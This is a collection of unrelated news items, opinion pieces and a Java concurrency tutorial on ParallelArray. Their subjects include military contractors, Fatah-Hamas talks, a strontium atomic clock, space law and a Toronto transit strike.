Deborah Avant , a political science professor at George Washington University , argues that the use of contractors “ shifts authority from the Congress to the executive ” because contractors can be deployed directly by the executive branch outside of the normal defense appropriations process , drawing reduced public and congressional scrutiny .
Their deaths are not officially counted in the Pentagon ’s death tolls and receive scant media attention .
A study by the Project for Excellence in Journalism found that out of a sample of 100,000 media stories from the past four years on Iraq , just 248 — less than one quarter of 1 percent — mentioned private security contractors at all .
The Defense Department ’s information on the contractors is so meager , in fact , that in 2004 , a Pentagon official called Singer to ask for his estimate on the number of American contractors in Iraq .
In recent years , Congress has finally begun to pay attention .
An early version of an amendment to the 2005 defense appropriations bill , proposed by Connecticut Senator Christopher Dodd , would have banned the use of contractors in combat and interrogations .
More recently , an amendment to the 2008 defense authorization bill , approved by the House of Representatives this spring , would establish guidelines governing contractor weapons and uniforms , create a database of contracted firms , and track their casualties .
This amendment may not make it through the legislative meat - grinder , but if it does , and if the Pentagon implements the UCMJ jurisdiction change , then contractors accompanying U.S. forces overseas may for the first time be actually subject to legal sanction and regulatory oversight .
Yet the privatization should still make us uneasy , because there is another price we pay for even the most well - regulated and cost - effective privatization : the virtue of our warriors .
As it stands now , the all - volunteer army makes use of market principles but has not surrendered to them .
To switch to private firms , though , is to turn war over to the marketplace on a scale not seen since the 1700s .
Soldiers ’ pay is far from adequate for the goals they achieve and the burdens they bear .
In its highest sense , military “ service ” is for far more than the money : our troops join out of duty , patriotism , or even a desire for greatness .
They fight to give back to the society that has given them so much , endangering their own lives abroad to protect ours here at home .
It is for this sacrifice that they deserve our admiration — regardless of the conflict in which they fight .
The private soldier of fortune claims none of this virtue .
Just another dangerous man laboring at dangerous work , he is without a G.I. Bill education , veterans ’ health care benefits , or burial in Arlington National Cemetery .
Combat is not merely another occupation , and we should be wary of degrading such a noble calling by renting it out .
Soldiers , sailors , airmen , and marines are a special breed , to be distinguished from the masses not only by vocation , but also by the character of their souls .
SANAA ( Reuters ) - Rival Palestinian factions Fatah and Hamas signed a Yemeni - sponsored deal on Sunday promising to revive direct talks after months of hostilities , but differences remained over the future of the Gaza Strip and West Bank .

The office of Palestinian President Mahmoud Abbas , who is also Fatah leader , said Hamas must accept to end its control of the Gaza Strip before any dialogue could take place .
“ We , the representatives of Fatah and Hamas , agree to the Yemeni initiative as a framework to resume dialogue between the two movements to return the Palestinian situation to what it was before the Gaza incidents , ” a declaration issued by the two delegations after talks in Sanaa said .
The Sanaa Declaration , signed by Hamas negotiator Moussa Abu Marzouk and Fatah official Azzam al - Ahmed , also affirmed the “ unity of the Palestinian people , territory and authority ” .
The Yemeni initiative calls for the situation in Gaza to return to the way it was before Hamas seized the territory in June after routing forces loyal to Abbas .
The violence left Hamas in control of Gaza and Fatah in control of the West Bank and entrenched divisions as the two movements vied for power and influence among the 4 million Palestinians in the two areas separated by Israel .
“ We regard the signing today of the Sanaa Declaration as a new beginning and the start of a new stage , ” said Abu Marzouk , whose party won parliamentary elections in January 2006 .
INTEREPRETATION DISPUTE
An apparent dispute broke out hours after the signing , with Abbas ’s office saying that the talks should be about implementing the Yemeni initiative .
“ Resumption of dialogue ... must take place to implement the Yemeni proposal and not to deal with it as a framework for dialogue because this will not lead to any result .
We want the implementation of the proposal .
We do not want talks over its articles , ” it said in a statement .
Fatah had said it would agree to direct reconciliation talks with Hamas only if the Islamist group first agreed to relinquish its hold on Gaza , home to 1.5 million Palestinians .
Hamas rejected the statement .
“ Fatah ’s comment reflects the presidency ’s lack of regard towards dialogue and it gives an impression that its signature is no more than an act of gratitude to the Yemenis , ” said Hamas spokesman Sami Abu Zuhri .

A Hamas official said on Saturday the group asked that the same condition should apply to the Israeli - occupied West Bank , where the Fatah - led Palestinian Authority has dismissed a Hamas - led unity government and arrested some Hamas supporters .
Despite the differences , Ahmed said he was looking forward to Yemen to set a date for new talks :
“ We look towards implementing the Yemeni initiative and fostering Palestinian national unity , ” he told reporters .
A senior Hamas official said talks would begin on April 5 with the first round being held in the Palestinian territories , but the Palestinian ambassador to Yemen , Ahmad Deek , said Yemen would issue invitations for talks there early next month .
Yemeni President Ali Abdullah Saleh had been pressing the Palestinians to begin talks in April and said Sanaa would ask the Arab Summit in Damascus on March 29 - 30 to endorse the initiative as a joint Arab plan .
Previous Arab - sponsored efforts to reconcile the Palestinians , including a Saudi- mediated deal reached in the Muslim holy city of Mecca in 2007 , have fallen by the wayside .
The Yemeni plan , which calls for a return to the framework accords laid in Mecca , the creation of another unity government and the reform of security forces along national rather than factional lines and then holding new Palestinian elections .
Abbas dismissed a Hamas - led Palestinian unity government after the Islamist group seized Gaza in June .
Nancy Pelosi Threatened by Wealthy Clinton Supporters
Remember at the beginning of the primary season after Huckabee , McCain , and Romney each won a different state ’s caucus or primary ?
Remember how the media spun this as the Republicans being in trouble because they had no clear front - runner ?
Remember how the media spun it that the Democrats were indeed the stronger party because they had two great front - runners ?
How ’s that working out for you ?
That seems a long , long time ago now does n’t it ?
As of today Republicans have their nominee , even if I think he is the worse candidate they could have nominated , and the Democrats still have their two “ strong ” candidates .
Today the Democrat candidates are shredding each other to pieces , there is in - fighting by party insiders on what to do and who should drop out , Democrat supports of either candidate say if their candidate loses they will vote for McCain , and party leaders are afraid the winner will come out so bloodied that he / she will not be able to win the white house .
There is even recent talk that Al Gore is going to rise out of the ashes of this bloody political campaign like a Phoenix and be the savior of the party .
All of this is just to much fun to watch .
Now we have 20 wealthy supporters of Hillary Clinton threatening Nancy Pelosi .
“ We have been strong supporters of the [ Democratic Congressional Campaign Committee ] , ” they wrote , referring to the House fund - raising arm overseen by Pelosi .
“ We therefore urge you to clarify your position on superdelegates and reflect in your comments a more open view . ”
They are telling her to clarify her position ?
I thought her position was pretty damn clear .
She said whoever has the most delegates is the person the super delegates should vote for .
How hard is that to understand ?
I love the line about “ a more open view . ”
That line is the kicker .
They are n’t really asking her to clarify her view , they are asking her to change it .
By a “ more open view ” , they really mean that they want her to be of the opinion that the super delegates should be open to over - ruling the will of the Democrat voters .
According to this article , Nancy Pelosi is now enraged at the Clinton campaign for this veiled threat at not helping to fund the Democrat nominee if it is not Hillary Clinton .
And rightfully so .
The House speaker was not backing down , however , and is still insisting that superdelegates respect “ the decisions of millions of Americans who have voted , ” her aide Brendan Daly said .
I can’t believe that I have just put myself in position to defend Nancy Pelosi , but I guess I have .
The audacity of the Clinton campaign , while not surprising , is unbelievable .
Actually it is n’t unbelievable coming from the Clinton ’s , I just ca n’t seem to find the right word .
The Clinton ’s think it is their right to return to the white house .
It is Hillary ’s long time dream to become the first woman president .
Why else would she have put up with all of Bill ’s shit for all of these years ?
Now it is slipping away and she will stop at nothing to get what she wants .
Even “ convincing ” super delegates to vote against the will of her party is acceptable to her and her campaign .
All of this has given me great pleasure to watch , and surely the Republicans stand a better chance of winning because of it .
Too bad conservatives do n’t have a horse in this race .

US physicists are rather pleased with themselves having perfected a clock " so accurate it will neither gain nor lose even a second in more than 200 million years " , Reuters reports .
The atomic timepiece , developed in the Joint Institute for Laboratory Astrophysics ( JILA ) - a collaboration between US Commerce Department 's National Institute of Standards ( NIST ) and Technology and the University of Colorado in Boulder - uses " thousands of strontium atoms suspended in grids of laser light " to achieve an accuracy more than twice that the NIST - F1 standard caesium clock (+/- one second per 80 million years ) .
The clock 's advantage over its caesium counterpart is due to its " use of light , which has higher frequencies than the microwaves used in NIST - F1 " .
ScienceDaily elaborates : " Because the frequencies are higher , the clocks divide time into smaller units , offering record precision . "
Specifically , the clock uses a few thousand strontium atoms held in a column of around 100 " pancake - shaped " traps forming the " optical lattice " , which is created by " standing waves of intense near - infrared laser light " .
This is described as " a sort of artificial crystal of light " which " constrains atom motion and reduces systematic errors that occur in clocks that use moving balls of atoms , such as NIST - F1 " .
Having trapped their atoms , the scientists detect strontium 's 430 trillion per second " ticks " by " bathing the atoms in very stable red laser light at the exact frequency that prompts jumps between two electronic energy levels " .
To improve accuracy , the team managed to " cancel out the atoms ' internal sensitivity to external magnetic fields , which otherwise degrade clock accuracy " , and also " characterised more precisely the effects of confining atoms in the lattice " .
To measure the device 's accuracy , the researchers compared its performance to another of their experimental clocks - a similarly optical version using calcium atoms *.
ScienceDaily clarifies : " The best clocks can be precisely evaluated by comparing them to other nearby clocks with similar performance ; very long - distance [ output ] signal transfer , such as by satellite , is too unstable for practical , reliable comparisons of the new generation of clocks .
In the latest experiment , signals from the two clocks were compared via a 3.5 - kilometer underground fiber - optic cable . "
Project leader Jun
Ye said : " This is our first comparison to another optical atomic clock .
As of now , Boulder is in a very unique position .
We have all the ingredients , including multiple optical clocks and the fiber - optic link , working so well .
Without a single one of these components , these measurements would not be possible .
It 's all coming together at this moment in time . "
Ye's next move is to run the strontium device against the world 's most accurate clock , NIST 's experimental single mercury ion clock , " accurate to about one second in 400 million years " when fired up back in 2006 and performing " even better today " , according to Jim Bergquist , the NIST physicist who built it .
The advantage of using mutiple atoms over the single ion approach is that the former produces a stronger signal , which may eventually allow clocks which outperform even the mercury - based device .
In case you 're pondering just where this lust for accuracy is leading , the JILA research is " expected to lead to new scientific tools for quantum simulations that will help scientists better understand how matter and light behave under the strange rules governing the nanoworld " , as well as permitting " new tests of fundamental physical laws to increase understanding of the universe " .
On a more practical level , a new , super - accurate optical atomic clock will be essential to " synchronize telecom networks and deep - space communications , as well as for navigation and positioning " .
While JILA now boasts optical clocks based on aluminium , calcium , mercury , strontium and ytterbium , rival labs worldwide are also working on similar devices and " it is not yet clear which design will emerge as the best and be chosen as the next international standard " , ScienceDaily concludes .
The JILA research is published in the latest issue of Science .
Bootnote
* The NIST calcium clock , which relies on " the ticking of clouds of millions of calcium atoms " , delivers " high stability for short times " , making it not much use as a long - term atomic timepiece , but ideal for comparative purposes .

The other day I met a young Iraqi doctor studying on my Master 's degree program .
After some conversation about his life and his losses in the war , I described the uncertainty some Americans feel about what the best thing is to do at this point and asked him what he thought .
Until that point he had been very calm and matter - of - fact about describing his experiences , but this question obviously shocked him .
He regained his composure , laughed a little , and said , " you 'll excuse me , but I think your question has such an obvious answer . "
Like many people , including yourself , I 've been asking myself the question of whether to withdraw from Iraq or stay there until some hoped - for peace is achieved after an indefinite number of more years and deaths .
He proceeded to explain that there was no more need for Americans to fear leaving a vacuum behind ; that the opportunity to avert that had passed several years ago , and that Iran had long since filled the vacuum .
Now , he said ( to paraphrase ) , U.S. troops staying in Iraq only prolonged the killing and pain .
As an obstetrician , he likened it to labor pains that would eventually cease , but first the foreign body , as it were , had to leave the host .
Naturally one man 's perspective should n't be taken as " the answer " , but I was struck by how little we hear of the opinions of Iraqis themselves on the matter of whether or not we should continue to occupy their country .
Efforts to illuminate their perspectives , whether through interviews , Iraqi editorials , or references to Iraqi blog posts are conspicuously absent from the discussion I 've observed .
Perhaps it 's because it seems obvious to some that they'd want us to go , but still I do n't see why they would be excluded from the conversation .
While some argue there are greater issues at stake , I 'm inclined to agree with my colleague that we may no longer be ( if ever we were ) able to influence them .
By the way , the Iraqi doctor also felt that Sen. Obama was the candidate most likely to get the U.S. out of Iraq and as such supported his campaign .
Last week , The New York Times asked the F.D.A. whether the Shanghai Pharmaceutical Group exported to the United States any drugs or pharmaceutical ingredients other than the abortion pill .
But after repeated requests , the agency declined to provide that information ; it did not cite a reason .

On at least two occasions in 2002 , Shanghai Hualian had shipments of drugs stopped at the United States border , F.D.A. records show .
One shipment was an unapproved antibiotic and the other a diuretic that had “ false or misleading labeling . ”
Records also show that another unit of Shanghai Pharmaceutical Group has filed papers declaring its intention to sell at least five active pharmaceutical ingredients to manufacturers for sale in the United States .
One major pharmaceutical company , Pfizer , declined to buy drug ingredients from Shanghai Pharmaceutical Group because of quality - related issues , said Christopher Loder , a Pfizer spokesman .
In 2006 , Pfizer agreed to evaluate Shanghai Pharmaceutical Group ’s “ capabilities ” as an ingredient supplier , but so far the company “ has not met the standards required by Pfizer , ” Mr. Loder said in a statement .
Because of opposition from the anti-abortion movement , the F.D.A. has never publicly identified the maker of the abortion pill for the American market .
The pill was first manufactured in France , and since its approval by the F.D.A. in 2000 it has been distributed in the United States by Danco Laboratories .
Danco , which does not list a street address on its
Web site , did not return two telephone calls seeking comment .
Problems with the cancer drugs first surfaced last summer after leukemia patients received injections of one cancer drug , methotrexate .
Afterward , patients experienced leg pain and , in some cases , paralysis .
At the People ’s Liberation Army No. 307 Hospital in Beijing , a 26 - year - old patient , Miao Yuguang , was unable to stand up five days after being injected in the spine with the drug .
“ We were already unlucky to have this illness , ” her father , Miao Futian , said of the leukemia .
“ Then we ran into this fake drug . ”
The authorities recalled two batches of the drug , but issued only mild warnings because the cause of the problem was unclear .
Officials with Shanghai Pharmaceutical Group stood by their products , saying that drug regulators investigating the plant had found no problems .
But when another cancer drug made in the same factory  cytarabin hydrochloride  also began causing adverse reactions , investigators suspected contamination .
In September , health and drug officials announced that they had found that the two drugs were contaminated with vincristine sulfate , a third cancer drug , during production .
After issuing a nationwide alert , the government announced a wider recall , and Shanghai ’s drug agency sealed manufacturing units at the plant .
Columbus Launch Puts Space Law To The Test
With many nations now active in space , and the prospect of commercial ventures such as tourism and even mining , the need for a clear and binding legal framework to govern space activities is more important than ever .
The likelihood of further international agreement on space law seems remote , however , in the present political climate .
by Staff Writers
Paris , France ( SPX ) Nov 06 , 2007
Whose law will apply when Europe 's Columbus space laboratory joins the US - led International Space Station in December ?
And what happens if astronauts from different countries get into a fight ?
Those were two of the questions posed at a meeting in Vienna last month to examine the contributions made by the humanities to the exploration of space .
Columbus is due to be launched into orbit aboard the US space shuttle Atlantis on December 6 .
It will become part of the International Space Station ( ISS ) and the most important module supplied by the European Space Agency ( ESA ) .
The conference Humans in Outer Space - Interdisciplinary Odysseys held on October 11 - 12 , was billed as " the first comprehensive trans - disciplinary dialogue on humans in outer space . "
It brought space scientists face to face with scholars from the humanities including experts in space law .
It was organised jointly by the European Science Foundation ( ESF ) , ESA and the Vienna - based European Space Policy Institute ( ESPI ) .
Dr Ulrike Bohlmann , of ESA 's legal department , told the conference that space law was based on the Outer Space Treaty of 1967 which she described as " the Magna Carta of spaceflight " .
It has been ratified by 98 states .
Following the tradition of maritime law , the treaty recognises that states have legal jurisdiction within spacecraft registered to them .
Dr Frans von der Dunk , of the International Institute of Air and Space Law at the University of Leiden , said that the space station posed new legal problems as it is being assembled from modules supplied by the United States , Russia and Japan as well as ESA .
The partners rejected an initial proposal that US law should prevail throughout the space station .
" It was agreed that each state registers its own separate elements , which means that you now have a piece of the US annexed to a piece of Europe annexed to a piece of Japan in outer space , legally speaking . "
But that did n't solve the problem of Columbus .
As a collaborative European project it cannot be registered to any one state and there is no such entity as " Europe " which can exercise legal jurisdiction .
So the partners had to find some novel solutions .
First was criminal law - what if one astronaut gets into a fight with another ?
" They decided that if somebody performs an activity which may be considered criminal , it is in the first instance his own country which is able to exercise jurisdiction , " Dr von der Dunk explained .
Another solution was found for patent law .
An invention created on the ISS will be patented in the country which has jurisdiction over the module in which the work was done .
For Columbus the inventor will have the choice of patenting in either Germany or Italy , the principal contributors to the module .
In practice , because of European patent agreements , it does not much matter in which country a patent is filed .
The parties also agreed a new approach to civil liability .
What happens if a US astronaut damages equipment in the European part of the space station ?
" The basic idea is that we all accept our own risks , " said Dr von der Dunk .
" We are all there together , we all have the same purpose to make the ISS into a big success and we do n't want that attitude , that mentality , to be disturbed by the threat of one party suing the other . "
Further ahead , whose law will apply if bases are established on the Moon and even on Mars ?
The Outer Space Treaty says that no nation can lay claim to the Moon .
" Outer space , including the Moon and other celestial bodies , is not subject to national appropriation by claim of sovereignty , by means of use or occupation , or by any other means , " said Dr Bohlmann .
She dismissed investment schemes which purport to sell property rights on other planets .
" You can not buy a piece of the Moon nor Mars , they are not subject to appropriation and they can not be sold .
You get a beautiful certificate but you do not have the right of ownership on any celestial body .
That is like if I were selling you the Eiffel tower . "
Jurisdiction on the Moon is not covered by existing treaties , said Dr von der Dunk .
" Jurisdiction is not possible on a territorial basis .
A base on the Moon can never qualify as the territory of any country in the world , so you have to find other means . "
It is also not clear what legal nationality a child born on the Moon would have .
With many nations now active in space , and the prospect of commercial ventures such as tourism and even mining , the need for a clear and binding legal framework to govern space activities is more important than ever .
The likelihood of further international agreement on space law seems remote , however , in the present political climate .
The UN Moon Agreement of 1979 sets out how states should behave when exploring the Moon and other planets but has only been ratified by 13 countries , none of which has the means to go to the Moon .
Until recently the humanities had little input into European space policy which has been dominated by political and industrial as well as scientific considerations .
The conference is developing the ' Vienna Vision on Humans in Outer Space ' which will establish a clear voice for a new and broader constituency to contribute to the future of human beings in space .
THE NSW Government has turned over a new leaf after decades of opposing commercial cannabis , revealing plans for a new scheme to grow the plant on an industrial scale .
It will introduce legislation in weeks to allow farms to grow hemp , the fibres and oil of which can be used in food and clothes , biofuels and skin -care products .
The state 's first legal hemp crop has been approved by police and will contain only tiny amounts of tetrahydrocannabinol , the psychoactive compound that some people smoke for recreation .
It will be planted later this year , with farmers no longer needing their licences to be approved by the NSW Health Department .

This content is part of the series : Java theory and practice Stay tuned for additional content in this series .
In the last installment of Java theory and practice , we examined the fork - join library , which will be added to the java.util.concurrent package in Java 7 .
Fork - join is a technique that makes it easy to express divide - and - conquer parallel algorithms in a way that admits efficient execution on a wide range of hardware , without code changes .
To effectively utilize the available hardware as processor counts increase , we are going to have to identify and exploit finer - grained parallelism in our programs .
In recent years , choosing coarse - grained task boundaries ( such as processing a single request in a Web application ) and executing tasks in thread pools often provided sufficient parallelism to achieve acceptable hardware utilization .
But moving forward , we 're going to have to dig deeper to find enough parallelism to keep the hardware busy .
One area that is ripe for parallelization is sorting and searching in large data sets .
It 's easy to express such problems using fork - join , as you saw in the previous installment .
But because these problems are so common , the class library provides an even easier way — ParallelArray .
Review : fork - join decomposition
Fork - join embodies the technique of divide - and - conquer ; take a problem and recursively break it down into subproblems until the subproblems are small enough that they can be more effectively solved sequentially .
The recursive step involves dividing a problem into two or more subproblems , queueing the subproblems for solution ( the fork step ) , waiting for the results of the subproblems ( the join step ) , and merging the results .
One example of such an algorithm is merge - sort , illustrated in Listing 1 , using the fork - join library :
Listing 1 . Merge - sort using the fork - join library
public class MergeSort extends RecursiveAction { final int [ ] numbers ; final int startPos , end Pos ; final int [ ] result ; private void merge ( MergeSort left , MergeSort right ) { int i=0 , leftPos=0 , rightPos=0 , leftSize = left.size ( ) , rightSize = right.size ( ) ; while ( leftPos < leftSize && right Pos < rightSize ) result [ i++] = ( left.result[leftPos ] < = right.result[rightPos ] ) ? left.result[leftPos++ ] : right.result[rightPos++ ] ; while ( leftPos < leftSize ) result [ i++] = left.result[leftPos++ ] ; while ( rightPos < rightSize ) result [ i++] = right.result[rightPos++ ] ; } public int size ( ) { return end Pos- startPos ; } protected void compute ( ) { if ( size ( ) < SEQUENTIAL_THRESHOLD ) { System.arraycopy( numbers , startPos , result , 0 , size ( ) ) ; Arrays.sort ( result , 0 , size ( ) ) ; } else { int midpoint = size ( ) / 2 ; MergeSort left = new MergeSort ( numbers , startPos , startPos+midpoint ) ; MergeSort right = new MergeSort ( numbers , startPos + midpoint , end Pos ) ; coInvoke ( left , right ) ; merge ( left , right ) ; } } }
Merge - sort is not an inherently parallel algorithm , as it can be done sequentially , and is popular when the data set is too large to fit in memory and must be sorted in pieces .
Merge sort has O( n log n ) worst - case and average - case performance .
But because the merging is difficult to do in place , generally , it has higher memory requirements than in - place sort algorithms , such as quick - sort .
But because the sorting of the subproblems can be done in parallel , it parallelizes better than quick - sort .
Given a fixed number of processors , parallelization still can't turn an O( n log n ) problem into an O(n ) one , but the more amenable the problem to parallelization , the closer to a factor of n cpus by which parallelization can reduce the total runtime .
Reducing the total runtime means that the user gets the result sooner — even if it takes more total CPU cycles to do the work in parallel than it does sequentially .
The principal benefit of using the fork - join technique is that it affords a portable means of coding algorithms for parallel execution .
The programmer does not have to be aware of how many CPUs will be available in deployment ; the runtime can do a good job of balancing work across available workers , yielding reasonable results across a wide range of hardware .
Fine - grained parallelism
The most accessible ( and alliterative ) source of finer - grained parallelism in mainstream server applications is sorting , searching , selection , and summarizing of data sets .
Each of these problems can be easily parallelized using divide - and - conquer , and can be easily represented as fork - join tasks .
For example , to parallelize the averaging of a large data set , you can recursively break it down into smaller data sets — as was done in merge - sort — average the subsets , and the combination step simply computes a weighted average of the averages of the subsets .
ParallelArray
For sorting and searching problems , the fork - join library gives you an even easier means of expressing parallelizable operations on data sets : the ParallelArray classes .
The idea is that a ParallelArray represents a collection of structurally similar data items , and you use the methods on ParallelArray to create a description of how you want to slice and dice the data .
You then use the description to actually execute the array operations ( which uses the fork - join framework under the hood ) in parallel .
This approach has the effect of letting you declaratively specify data selection , transformation , and post - processing operations , and letting the framework figure out a reasonable parallel execution plan , just as database systems allow you to specify data operations in SQL and hide the mechanics of how the operations are implemented .
Several implementations of ParallelArray are available for different data types and sizes , including for arrays of objects and for arrays of various primitives .
Listing 2 shows an example of using ParallelArray to summarize student grades , illustrating the basic operations of selection , projection , and summarization .
The Student class contains information about students ( name , graduation year , GPA ) .
The helper object isSenior is used to select only the students graduating this year , and the helper object getGpa extracts the GPA field from a given student .
The expression at the beginning of the listing creates a ParallelArray representing a set of students and then uses it to select the best GPA from the students graduating this year .
Listing 2 . Using ParallelArray to select , process , and summarize data
ParallelArray < Student > students = new ParallelArray < Student >( fjPool , data ) ; double bestGpa = students.withFilter(isSenior ) .withMapping(selectGpa ) .max ( ) ; public class Student { String name ; int graduationYear ; double gpa ; } static final Ops. Predicate < Student > isSenior = new Ops. Predicate < Student >( ) { public boolean op ( Student s ) { return s.graduationYear == Student .
THIS_YEAR ; } } ; static final Ops.ObjectToDouble < Student > selectGpa = new Ops.ObjectToDouble < Student >( ) { public double op ( Student student ) { return student.gpa ; } } ;
The code for expressing operations on parallel arrays is somewhat deceptive .
The withFilter ( ) and withMapping ( ) methods do not actually search or transform the data ; they merely set up the parameters of the " query . "
The actual work is done in the final step , in this case , the call to max ( ) .
The basic operations supported by ParallelArray are as follows :
Filtering : Selecting a subset of the elements to be involved in a computation .
In Listing 2 , the filter was specified with the withFilter ( ) method .
Selecting a subset of the elements to be involved in a computation .
In Listing 2 , the filter was specified with the method .
Application : Applying a procedure to each selected element .
Listing 2 does n't show this technique , but the apply ( ) method allows you to perform an action for each selected element .
Applying a procedure to each selected element .
Listing 2 does n't show this technique , but the method allows you to perform an action for each selected element .
Mapping : Converting selected elements to another form ( such as extracting a data field from the element ) .
This conversion is done in the example by the withMapping ( ) method , where we convert Student to the student 's GPA .
The result is a ParallelArray of the results of the specified selection and mapping .
Converting selected elements to another form ( such as extracting a data field from the element ) .
This conversion is done in the example by the method , where we convert to the student 's GPA .
The result is a of the results of the specified selection and mapping .
Replacement : Creating a new parallel array by replacing each element with another derived from it .
This technique is similar to mapping , but produces a new ParallelArray on which further queries may be performed .
One case of replacement is sorting , where elements are replaced with different elements so that the resulting array is in sorted order ( the built - in sort ( ) method is provided for this action ) .
Another special case is the cumulate ( ) method , which replaces each element with a running accumulation according to a specified combination operation .
Replacement can also be used to combine multiple ParallelArray s , such as creating a ParallelArray whose elements are the values of a [ i ] + b[ i ] for parallel arrays a and b .

This technique is similar to mapping , but produces a new on which further queries may be performed .
One case of replacement is sorting , where elements are replaced with different elements so that the resulting array is in sorted order ( the built - in method is provided for this action ) .
Another special case is the method , which replaces each element with a running accumulation according to a specified combination operation .
Replacement can also be used to combine multiple s , such as creating a whose elements are the values of for parallel arrays and .
Summarization : Combining all the values into a single value , such as computing a sum , average , minimum , or maximum .
The example in Listing 2 uses the max ( ) method .
The predefined summarization methods , such as min( ) , sum ( ) , and max ( ) , are built using the more general - purpose reduce ( ) method .
Common summary operations
In Listing 2 , we were able to specify the calculation of the highest GPA of any student , but what we probably want is something slightly different — which student had the highest GPA .
This calculation could be done using two computations ( one to compute the highest GPA , and another to select the students who have that GPA ) , but ParallelArray provides an easier means of getting at commonly desired summary statistics such as maximum , minimum , sum , average , and the index of the maximal and minimal elements .
The summary ( ) method computes these summary statistics in a single , parallel operation .
Listing 3 shows the summary ( ) method computing the summary statistics , which include the indexes of the minimal and maximal elements , to avoid having to make multiple passes on the data :
Listing 3 . Finding the student with the highest GPA
SummaryStatistics summary = students.withFilter(isSenior ) .withMapping(selectGpa ) .summary ( ) ; System.out.println ( " Worst student : " + students.get(summary.minIndex ( ) ) .name ; System.out.println ( " Average GPA : " + summary.getAverage ( ) ;
Limitations
ParallelArray is not intended to be a general - purpose in - memory database , nor a general - purpose mechanism for specifying data transformations and extractions ( like the language - integrated query — LinQ — features in . NET 3.0 ) ; it is intended only to simplify the expression of a specific range of data selection and transformation operations so that they can be easily and automatically parallelized .
Accordingly , it has several limitations ; for example , filter operations must be specified before mapping operations .
( Multiple filter operations are permitted , though it is often more efficient to combine them into a single compound - filter operation . )
Its main purpose is to free developers from thinking about how the work can be parallelized ; if you can express the transformation in terms of the operations provided by ParallelArray , you should get reasonable parallelization for no effort .
Performance
To assess the effectiveness of ParallelArray , I wrote a simple , unscientific program that runs the query for various sizes of array and fork - join pools .
The results were run on a Core 2 Quad system running Windows .
Table 1 shows the speedup relative to the base case ( 1000 students , one thread ) :
Table 1 . Performance measurement for the max - GPA query
Students Threads 1 2 4 8 1000 1.00 0.30 0.35 1.20 10000 2.11 2.31 1.02 1.62 100000 9.99 5.28 3.63 5.53 1000000 39.34 24.67 20.94 35.11 10000000 340.25 180.28 160.21 190.41
While the results are fairly noisy ( biased by a number of factors , including GC activity ) , you can see that not only are the best results achieved with a pool size equal to the number of cores available ( which you would expect , given that the tasks are entirely compute - bound ) , but that also we 've achieved a speedup of 2 - 3 x with four cores compared to one , showing that it is possible to get reasonable parallelism using high - level , portable mechanisms without tuning .
Connection with closures
ParallelArray offers a nice way to declaratively specify filtering , processing , and aggregation operations on data sets , while also facilitating automatic parallelization .
However , even though the syntax is easier to express than using the raw fork - join library , the syntax is still somewhat cumbersome ; each filter , mapper , and reducer is usually specified as an inner class , so simple queries like " find the highest GPA of any student graduating this year " is still on the order of a dozen lines of code .
One of the possibilities for addition to the Java language in Java 7 is closures ; one of the arguments in favor of closures is that it makes expressing small snippets of code — such as filters , mappers , and reducers in ParallelArray — much more compact .
Listing 4 shows the max - GPA query rewritten using the BGGA closures proposal .
( In the version of ParallelArray extended with function types , the type of the parameter to withFilter ( ) is not Ops. Predicate < T> , but instead the function type { T => boolean } . )
The closures notation strips away the boilerplate associated with inner classes , allowing a more compact ( and more importantly , more direct ) expression of the desired data operation .
Now the code is down to three lines , almost all of it expressing some important aspect of the result we are trying to achieve .
Listing 4 . Writing the max - GPA example using closures
double bestGpa = students.withFilter( {Student s => ( s.graduationYear == THIS_YEAR ) } ) .withMapping ({ Student s => s.gpa } ) .max ( ) ;
Summary
As the number of available processors increases , we 're going to need to find finer - grained sources of parallelism in our programs .
One of the most attractive candidates for doing so is aggregate data operations — sorting , searching , and summarizing .
The fork - join library , to be introduced in JDK 7 , offers a means of " portably expressing " a certain class of parallelizable algorithm , so that the program can run efficiently on a range of hardware platforms .
The ParallelArray component of the fork - join library can make it even easier to express parallel aggregate operations by declaratively describing the operation you want to perform and letting ParallelArray figure out how to execute it efficiently .

Toronto Transit workers forced back to work by strike - breaking law
By Carl Bronski
28 April 2008
A thirty - six hour strike by the nine thousand members of Local 113 of the Amalgamated Transit Workers union ended abruptly Sunday afternoon , when the trade union - backed New Democratic Party joined with the other two parties in the Ontario legislature to unanimously pass an emergency back - to - work order .
The legislation , initiated by Liberal provincial Premier Dalton McGuinty , calls for the appointment of a labour arbitrator to decide outstanding issues in the dispute between the union and the Toronto Transit Commission ( TTC ) .
The order also threatened a two thousand dollar per day fine for any transit worker defying the law and a twenty - five thousand dollar per day penalty for the union should it resist the order .
Just as they did with the garbage strike in Toronto in 2002 , Howard Hampton and the other New Democratic Party members of the assembly wholeheartedly supported the Liberals and Conservatives in their rush to crush the strike .
The legislation was also heralded by Toronto Mayor David Miller , a Clintonesque politician who has received support from the unofficial NDP group in city council , even whilst overseeing a fifteen year tax plan that is geared toward massively redistributing wealth in the city from tenants and homeowners to big commercial interests .
Immediately after the legislation received royal assent , ATU President Bob Kinnear issued a statement to his membership calling for them to return to work as soon as possible .
Buses and some subway trains began moving again late Sunday night .
Kinnear had called the sudden strike for midnight on Friday , just a few hours after his membership had voted down by a 65 percent margin a tentative agreement he had negotiated with the employer only last week .
A rift in the ATU union bureaucracy had resulted in seven of the fifteen executive members of the local refusing to recommend the tentative agreement to their members .
Kinnear had made wages and increased compensation for drivers injured on the job the union ’s central demands .
When the TTC offered wage increases of 3 per cent in each year of a three - year contract and promised to establish an enhanced review process for certain injured workers ’ claims , Kinnear and a slim majority of the Local 113 Executive Committee caved into governmental pressure for “ labor peace ” at the TTC and signed the deal .
However , one third of the workforce , comprised of maintenance and trade workers in the repair garages , were angered that there was next to nothing in the contract protecting them against contracting out .
The TTC has purchased 468 new buses over the past eighteen months that come with repair warranty claims from the manufacturer that threaten the jobs of the depot workers .
As one worker , a bus driver , stated after voting against the deal , “ I did n’t see anything wrong with the transit side of this , but I had to vote no because they ’re contracting out the maintenance work .
That ’s what a union is all about .
You got to look out for your co-workers . ”
The strike caught Mayor Miller , Toronto City Council , and the TTC completely flat - footed and stranded tens of thousands of transit riders into the early hours of Saturday morning .
Kinnear had made repeated assurances to city officials and the general public that his union would provide forty - eight hours ’ notice should any work stoppage be called .
Transit workers on duty Friday evening , given only an hour ’s notice of the impending action , were themselves surprised by the strike order .
But Kinnear had no intention of leading a successful job action in support of the demands of his membership .
Any such struggle would have required an appeal to the working people of Toronto , almost a million of whom depend on the transit system for their weekday work commutes .
It would have had to take into account the inevitability of strikebreaking legislation .
After all , the premier had threatened as much only a week earlier in a public statement .
